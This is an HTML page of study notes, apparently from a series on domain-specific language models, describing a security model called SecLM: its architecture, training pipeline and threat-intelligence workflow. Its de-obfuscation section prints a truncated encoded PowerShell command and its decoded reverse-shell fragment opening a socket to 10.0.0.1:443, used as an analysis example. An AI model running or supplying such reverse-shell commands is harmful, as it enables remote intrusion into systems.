@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SecLM &amp; Cybersecurity Operations | Domain Notes</title>
+<link rel="stylesheet" href="shared.css">
+<style>
+  :border {
+    border-color: #384454;
+  }
+  :root {
+    --bg: #0b0c10;
+    --surface: #121620;
+    --surface2: #1c2230;
+    --border: #2c354a;
+    --accent: #ff3b30;
+    --accent2: #ef233c;
+    --accent3: #ff6b6b;
+    --accent4: #6af7c8;
+    --text: #edf2f7;
+    --muted: #718096;
+    --white: #ffffff;
+  }
+  
+  /* Mobile Menu Hamburger */
+  .mobile-menu-btn {
+    display: none;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    color: var(--white);
+    padding: 8px 16px;
+    font-family: 'Syne', sans-serif;
+    font-size: 12px;
+    font-weight: bold;
+    cursor: pointer;
+    align-items: center;
+    gap: 8px;
+    transition: all 0.2s;
+  }
+  .mobile-menu-btn:hover {
+    border-color: var(--accent);
+    color: var(--accent3);
+  }
+
+  @media (max-width: 900px) {
+    .mobile-menu-btn {
+      display: inline-flex;
+    }
+    .sidebar {
+      position: fixed;
+      top: 65px;
+      left: -260px;
+      width: 240px;
+      height: calc(100vh - 65px);
+      background: var(--surface);
+      z-index: 90;
+      transition: left 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      display: block !important;
+      padding: 24px 0;
+      box-shadow: 10px 0 30px rgba(0,0,0,0.5);
+    }
+    .sidebar.active {
+      left: 0;
+    }
+    .sidebar-overlay {
+      display: none;
+      position: fixed;
+      inset: 65px 0 0 0;
+      background: rgba(0,0,0,0.6);
+      backdrop-filter: blur(4px);
+      z-index: 80;
+    }
+    .sidebar-overlay.active {
+      display: block;
+    }
+  }
+</style>
+</head>
+<body>
+<nav>
+  <a href="domain-specific-llms.html" class="nav-logo">Domain<span>.</span>LLMs</a>
+  <ul class="nav-links">
+    <li><a href="domain-specific-llms.html" class="nav-back">← Hub</a></li>
+    <li><a href="index.html">ML Notes</a></li>
+    <li><a href="page-ds-healthcare.html">Ch.2 Healthcare</a></li>
+    <li><button class="mobile-menu-btn" id="menu-toggle">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:middle;"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      Chapters
+    </button></li>
+  </ul>
+</nav>
+
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+
+<div class="page-hero" style="background: linear-gradient(135deg, #0b0c10, #2a0c0c);">
+  <div class="page-hero-grid"></div>
+  <div class="page-hero-glow" style="background:radial-gradient(circle, rgba(255,59,48,0.15) 0%, transparent 70%)"></div>
+  <p class="page-eyebrow fade-up">Volume 05</p>
+  <h1 class="page-title fade-up d1">SecLM &amp; <em>Cybersecurity</em> Operations</h1>
+  <p class="page-desc fade-up d2">Analyze specialized vertical LLM training methodologies and planning frameworks designed for threat intelligence, log querying, and PowerShell code analyses.</p>
+</div>
+
+<div class="page-layout">
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-section">
+      <p class="sidebar-label">This Volume</p>
+      <ul class="sidebar-nav">
+        <li><a href="#ops" class="active">2.1 Operational Challenges</a></li>
+        <li><a href="#seclmapi">2.2 The SecLM Core API</a></li>
+        <li><a href="#training">2.3 Specialized Training Flow</a></li>
+        <li><a href="#threat">2.4 Threat Intel Reasoning</a></li>
+        <li><a href="#script">2.5 PowerShell De-obfuscation</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-section">
+      <p class="sidebar-label">Next Volume</p>
+      <ul class="sidebar-nav">
+        <li><a href="page-ds-healthcare.html" style="color:var(--accent3); font-weight:bold;">Ch.2 Clinical Healthcare →</a></li>
+      </ul>
+    </div>
+  </aside>
+
+  <main class="main-content">
+
+    <!-- OPERATIONAL CHALLENGES -->
+    <div class="content-section">
+      <span class="section-anchor" id="ops"></span>
+      <h2 class="section-h">2.1 Core Cybersecurity Challenges <span class="section-badge">Risks</span></h2>
+      <p>Modern cybersecurity data is heavily siloed, and the threat landscape changes on an hourly basis. Securing complex web architectures requires addressing three highly technical pain points:</p>
+
+      <ul class="content-list">
+        <li><strong>Fuzz-Testing Target Identifications:</strong> It is unacceptably difficult for application developers to identify the optimal code endpoints to execute fuzz-testing. SecLM structures call stacks and automatically generates appropriate fuzzing payloads.</li>
+        <li><strong>Least Privilege Alignments:</strong> Given historical user access patterns and current active policies, the system must analyze and construct minimal configuration adjustments, pruning redundant administrative roles.</li>
+        <li><strong>Security Conceptual Translation:</strong> Junior analysts often struggle to break down high-level theoretical attacks (such as "lateral movement" or "APT41 TTPs") into actionable database queries inside active systems.</li>
+      </ul>
+    </div>
+
+    <!-- SECLM API -->
+    <div class="content-section">
+      <span class="section-anchor" id="seclmapi"></span>
+      <h2 class="section-h">2.2 The SecLM API Architecture <span class="section-badge">Platform</span></h2>
+      <p>To address these challenges, general-purpose LLMs alone are insufficient due to high hallucination rates and data exposure risks. SecLM represents a specialized platform combining three distinct layers:</p>
+      
+      <div class="compare-grid">
+        <div class="compare-card">
+          <div class="compare-card-title" style="color:var(--accent);">Top Layer: Actuators</div>
+          <p style="font-size:12.5px;color:var(--muted);">Security tools that understand context and can actuate configuration changes.</p>
+        </div>
+        <div class="compare-card">
+          <div class="compare-card-title" style="color:var(--accent3);">Middle Layer: SecLM API</div>
+          <p style="font-size:12.5px;color:var(--muted);">A specialized security model API with advanced planning and multi-step reasoning capabilities.</p>
+        </div>
+        <div class="compare-card">
+          <div class="compare-card-title" style="color:var(--accent4);">Bottom Layer: Datastores</div>
+          <p style="font-size:12.5px;color:var(--muted);">Authoritative security intelligence records and historical operational assets.</p>
+        </div>
+      </div>
+
+      <h3 class="sub-h">Four Architectural Pillars of SecLM</h3>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div class="step-body"><div class="step-title">Vulnerability Freshness</div><div class="step-desc">Must access daily threat data. Because retraining models daily is unfeasible, SecLM retrieves fresh indicators on-the-fly.</div></div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-body"><div class="step-title">User-Data Isolation</div><div class="step-desc">Operates purely within the user's isolated environment without exposing sensitive configuration data to external models.</div></div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-body"><div class="step-title">Deep Security Expertise</div><div class="step-desc">Decomposes high-level security concepts into specific technical strings for immediate matching inside files.</div></div></div>
+        <div class="step"><div class="step-num">4</div><div class="step-body"><div class="step-title">Multi-Step Reasonings</div><div class="step-desc">Combines heterogenous data sources sequentially to solve complex investigative tasks.</div></div></div>
+      </div>
+    </div>
+
+    <!-- TRAINING -->
+    <div class="content-section">
+      <span class="section-anchor" id="training"></span>
+      <h2 class="section-h">2.3 Specialized Model Training Pipeline <span class="section-badge">Pipeline</span></h2>
+      <p>Developing SecLM requires specialized training to overcome three main model constraints: a lack of high-quality publicly available threat logs, the highly technical multi-disciplinary language utilized by analysts, and the sensitivity of abuse datasets (such as live malware binaries, which general models are intentionally designed to block).</p>
+
+      <div style="text-align: center; margin: 28px 0;">
+        <!-- Inline SVG: SecLM Training Flow -->
+        <svg viewBox="0 0 700 200" width="100%" height="auto" style="background:#121620; border:1px solid #2c354a; border-radius:4px;">
+          <!-- Blocks -->
+          <g transform="translate(10, 40)">
+            <rect x="10" y="20" width="120" height="60" rx="3" fill="#1c2230" stroke="#718096"/>
+            <text x="70" y="45" fill="#edf2f7" font-size="11" font-family="sans-serif" text-anchor="middle" font-weight="bold">Foundational LM</text>
+            <text x="70" y="60" fill="#718096" font-size="9" font-family="monospace">General pretraining</text>
+            
+            <rect x="175" y="20" width="130" height="60" rx="3" fill="#1c2230" stroke="#ef233c"/>
+            <text x="240" y="45" fill="#edf2f7" font-size="11" font-family="sans-serif" text-anchor="middle" font-weight="bold">Continued Pretrain</text>
+            <text x="240" y="60" fill="#ef233c" font-size="9" font-family="monospace">Blogs, Reports, Books</text>
+
+            <rect x="350" y="20" width="130" height="60" rx="3" fill="#1c2230" stroke="#ff3b30"/>
+            <text x="415" y="45" fill="#edf2f7" font-size="11" font-family="sans-serif" text-anchor="middle" font-weight="bold">Supervised Tuning</text>
+            <text x="415" y="60" fill="#ff3b30" font-size="9" font-family="monospace">Malware scripts, SFT</text>
+
+            <rect x="525" y="10" width="130" height="80" rx="6" fill="#251212" stroke="#ff6b6b"/>
+            <text x="590" y="40" fill="#edf2f7" font-size="12" font-family="sans-serif" text-anchor="middle" font-weight="bold">Core SecLM</text>
+            <text x="590" y="55" fill="#ff6b6b" font-size="9" font-family="monospace">+ PET adapters</text>
+            <text x="590" y="70" fill="#ff3b30" font-size="9" font-family="monospace">(Proprietary logs)</text>
+
+            <!-- Arrows -->
+            <path d="M 130 50 L 175 50" stroke="#fff" stroke-width="1.5" marker-end="url(#arrow)"/>
+            <path d="M 305 50 L 350 50" stroke="#fff" stroke-width="1.5" marker-end="url(#arrow)"/>
+            <path d="M 480 50 L 525 50" stroke="#fff" stroke-width="1.5" marker-end="url(#arrow)"/>
+          </g>
+          <defs>
+            <marker id="arrow" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+              <path d="M 0 0 L 10 5 L 0 10 z" fill="#fff"/>
+            </marker>
+          </defs>
+        </svg>
+      </div>
+
+      <h3 class="sub-h">Derivative Model Compartmentalization</h3>
+      <p>To balance core task generalization with user confidentiality, sensitive client logs are never included in general pre-training. Instead, they are isolated using **Parameter-Efficient Tuning (PET) adapters** on top of the Core SecLM base, allowing lightweight tuning adjustments without degrading general performance.</p>
+      
+      <div class="callout yellow">
+        <div class="callout-title">Evaluation Metrics Rubric</div>
+        Since downstream security tasks have distinct trade-offs, fine-tuned models are evaluated using a combined rubric:
+        <ul style="padding-left:20px;margin-top:8px;">
+          <li><strong>Quantitative Logs:</strong> Classified as standard mathematical classification metrics (precision, recall, F1 scores) for malware classifications.</li>
+          <li><strong>Generations Similarity:</strong> Compared to reference responses using similarity metrics (ROUGE, BLEU, and BERTScore).</li>
+          <li><strong>LLM Auto-Evaluators:</strong> Automated side-by-side preference ratings using larger LLM engines.</li>
+          <li><strong>Human Evaluators:</strong> Board-certified security analysts scoring outputs using Likert metrics.</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- THREAT INTEL -->
+    <div class="content-section">
+      <span class="section-anchor" id="threat"></span>
+      <h2 class="section-h">2.4 Multi-Step Threat Intelligence Reasoning <span class="section-badge">Threats</span></h2>
+      <p>Cybersecurity operations are modeled as multi-step orchestration workflows. Consider an analyst querying indications of compromise for the Advanced Persistent Threat actor **APT41**:</p>
+
+      <div style="text-align: center; margin: 28px 0;">
+        <!-- Inline SVG: SecLM Threat Reasoner -->
+        <svg viewBox="0 0 700 240" width="100%" height="auto" style="background:#121620; border:1px solid #2c354a; border-radius:4px;">
+          <!-- Node boxes -->
+          <g transform="translate(10, 10)">
+            <!-- Analyst -->
+            <rect x="10" y="90" width="100" height="50" rx="3" fill="#1c2230" stroke="#718096"/>
+            <text x="60" y="115" fill="#edf2f7" font-size="11" font-family="sans-serif" text-anchor="middle">Analyst Query</text>
+            <text x="60" y="130" fill="#718096" font-size="9" font-family="monospace">"APT41 Indicators"</text>
+
+            <!-- Planner -->
+            <rect x="160" y="90" width="110" height="50" rx="3" fill="#1c2230" stroke="#ef233c"/>
+            <text x="215" y="115" fill="#edf2f7" font-size="11" font-family="sans-serif" text-anchor="middle" font-weight="bold">SecLM API Planner</text>
+            <text x="215" y="130" fill="#ef233c" font-size="9" font-family="monospace">Reasoning loop</text>
+
+            <!-- GCS Threat Intel -->
+            <rect x="330" y="20" width="120" height="50" rx="3" fill="#1c2230" stroke="#6af7c8"/>
+            <text x="390" y="45" fill="#edf2f7" font-size="10" font-family="sans-serif" text-anchor="middle">1. Threat Intel RAG</text>
+            <text x="390" y="58" fill="#6af7c8" font-size="9" font-family="monospace">Fetch APT41 TTPs</text>
+
+            <!-- SFT Extractor -->
+            <rect x="330" y="90" width="120" height="50" rx="3" fill="#1c2230" stroke="#6af7c8"/>
+            <text x="390" y="115" fill="#edf2f7" font-size="10" font-family="sans-serif" text-anchor="middle">2. Extractor LLM</text>
+            <text x="390" y="128" fill="#6af7c8" font-size="9" font-family="monospace">Extract IOC IPs/Hashes</text>
+
+            <!-- SIEM -->
+            <rect x="330" y="160" width="120" height="50" rx="3" fill="#1c2230" stroke="#6af7c8"/>
+            <text x="390" y="185" fill="#edf2f7" font-size="10" font-family="sans-serif" text-anchor="middle">3. SIEM Search</text>
+            <text x="390" y="198" fill="#6af7c8" font-size="9" font-family="monospace">Query log indices</text>
+
+            <!-- Final Response -->
+            <rect x="520" y="90" width="130" height="50" rx="3" fill="#251212" stroke="#ff6b6b"/>
+            <text x="585" y="115" fill="#edf2f7" font-size="11" font-family="sans-serif" text-anchor="middle" font-weight="bold">Final Report</text>
+            <text x="585" y="128" fill="#ff6b6b" font-size="9" font-family="monospace">"2 matching log entries"</text>
+
+            <!-- Arrows -->
+            <path d="M 110 115 L 160 115" stroke="#fff" stroke-width="1.5" marker-end="url(#arrow)"/>
+            <path d="M 270 110 L 330 45" stroke="#555" stroke-width="1.5" marker-end="url(#arrow)"/>
+            <path d="M 270 115 L 330 115" stroke="#555" stroke-width="1.5" marker-end="url(#arrow)"/>
+            <path d="M 270 120 L 330 185" stroke="#555" stroke-width="1.5" marker-end="url(#arrow)"/>
+            <path d="M 450 45 L 520 110" stroke="#fff" stroke-width="1.5" marker-end="url(#arrow)"/>
+            <path d="M 450 115 L 520 115" stroke="#fff" stroke-width="1.5" marker-end="url(#arrow)"/>
+            <path d="M 450 185 L 520 120" stroke="#fff" stroke-width="1.5" marker-end="url(#arrow)"/>
+          </g>
+        </svg>
+      </div>
+
+      <p>The **SecLM API Planner** acts as the central brain. It receives the high-level analyst query and orchestrates the multi-step retrieval process: 
+      1) Searches external threat intelligence datastores for recent APT41 profiles,
+      2) Passes the bulky raw output to a fine-tuned SFT extractor model to isolate specific indicators of compromise (IOCs),
+      3) Translates the IOC details into database SQL/Splunk syntax, queries the local SIEM index, and presents a finalized, verified threat assessment.</p>
+    </div>
+
+    <!-- POWERSHELL DE-OBFUSCATION -->
+    <div class="content-section">
+      <span class="section-anchor" id="script"></span>
+      <h2 class="section-h">2.5 PowerShell De-obfuscation Tool Usage <span class="section-badge">Tool</span></h2>
+      <p>Threat actors frequently utilize "living off the land" techniques, using obfuscated scripts to bypass system detection layers. SecLM integrates tool-use directly inside its loop to analyze such scripts safely:</p>
+
+      <div class="callout green">
+        <div class="callout-title">PowerShell Obfuscated PowerShell Command Analysis</div>
+        <strong>Input Script:</strong><br>
+        <code>powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxACIALAA0ADQAMwApADs...</code>
+        <br><br>
+        <strong>SecLM Tool-Use Execution:</strong>
+        <div class="steps">
+          <div class="step"><div class="step-num">1</div><div class="step-body"><div class="step-title">Tool Actuation</div><div class="step-desc">The model identifies that the payload is base64 encoded, triggers a local **Base64 Decode Tool** execution, and fetches the raw string.</div></div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-body"><div class="step-title">De-obfuscated Output</div><div class="step-desc"><code>$client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",443); $stream = $client.GetStream(); ...</code></div></div></div>
+          <div class="step"><div class="step-num">3</div><div class="step-body"><div class="step-title">Reasoned Assessment</div><div class="step-desc">The model analyzes the de-obfuscated PowerShell code and explains that the script attempts to open a direct socket connection to an external IP (10.0.0.1) on port 443, classifying it as a **Reverse Shell Trojan Attempt**.</div></div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="chapter-nav">
+      <a href="domain-specific-llms.html"><span class="nav-dir">← Previous</span><span class="nav-title">Hub Overview</span></a>
+      <a href="page-ds-healthcare.html" style="border-color: rgba(239,35,60,0.45); background: linear-gradient(to right, rgba(18,22,32,0.4), rgba(239,35,60,0.06));"><span class="nav-dir" style="color: var(--accent2);">Start Next Chapter →</span><span class="nav-title" style="color: var(--accent2);">MedLM &amp; Clinical Healthcare</span></a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+  // Mobile drawer trigger
+  const menuToggle = document.getElementById('menu-toggle');
+  const sidebar = document.getElementById('sidebar');
+  const overlay = document.getElementById('sidebar-overlay');
+  
+  function toggleSidebar() {
+    sidebar.classList.toggle('active');
+    overlay.classList.toggle('active');
+  }
+  
+  menuToggle.addEventListener('click', toggleSidebar);
+  overlay.addEventListener('click', toggleSidebar);
+
+  // Active link highlighting on scroll
+  const sections = document.querySelectorAll('.section-anchor');
+  const links = document.querySelectorAll('.sidebar-nav a');
+  window.addEventListener('scroll', () => {
+    let cur = '';
+    sections.forEach(s => { if (window.scrollY >= s.offsetTop - 120) cur = s.id; });
+    links.forEach(l => { 
+      l.classList.remove('active'); 
+      if (l.getAttribute('href') === '#' + cur) l.classList.add('active'); 
+    });
+  });
+</script>
+</body>
+</html>
